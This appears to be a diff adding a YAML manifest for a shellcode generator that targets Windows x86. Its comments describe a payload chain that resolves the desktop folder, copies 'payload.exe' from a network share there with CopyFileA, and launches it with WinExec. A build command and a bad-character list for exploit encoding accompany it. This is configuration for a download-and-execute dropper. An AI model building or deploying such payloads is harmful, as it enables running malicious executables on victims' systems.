@@ -1,0 +1,11 @@
+# SHGetFolderPathA path discovery + CopyFileA + WinExec
+# IR workflow: LoadLibraryA(shell32) -> SHGetFolderPathA(CSIDL_DESKTOP) ->
+#   lstrcatA -> CopyFileA -> WinExec
+# CSIDL_DESKTOP=0x00, CSIDL_APPDATA=0x1A, CSIDL_PERSONAL=0x05
+#
+# Build:
+#   uv run emitrion emitrion/manifests/win-x86/folder_path_exec.yaml \
+#       --src "\\\\host\\share\\payload.exe" \
+#       --dst "\payload.exe" --no-assemble --out emitter_out/
+template: ir_folder_path_exec
+badchars: ["00", "0A", "0D"]
